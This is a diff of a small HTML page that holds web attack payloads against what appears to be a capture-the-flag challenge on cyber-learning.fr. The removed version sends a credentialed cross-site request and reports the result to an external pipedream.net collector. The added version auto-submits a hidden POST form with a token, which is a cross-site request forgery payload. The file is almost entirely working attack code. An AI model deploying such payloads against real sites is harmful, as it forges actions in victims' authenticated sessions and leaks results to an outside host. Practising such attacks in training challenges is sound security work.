@@ -1,11 +1,17 @@
-<html><body><script>
-fetch('https://cyber-learning.fr/cyber-challenge/web/web108/index.php?a=Accueil&jeton=Pfr1PRXGWA', {
-  credentials: 'include'
-})
-.then(r => {
-  fetch('https://eod316u9kkhu7o3.m.pipedream.net/?status='+r.status)
-})
-.catch(e => {
-  fetch('https://eod316u9kkhu7o3.m.pipedream.net/?error='+btoa(e.toString()))
-})
-</script></body></html>
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+var f=document.createElement('form');
+f.method='POST';
+f.action='https://cyber-learning.fr/cyber-challenge/web/web109/index.php?jeton=Zoi2D5dKdD';
+var i1=document.createElement('input');
+i1.name='jeton';i1.value='Zoi2D5dKdD';
+var i2=document.createElement('input');
+i2.name='a';i2.value='Accueil';
+f.appendChild(i1);f.appendChild(i2);
+document.body.appendChild(f);
+f.submit();
+</script>
+</body>
+</html>
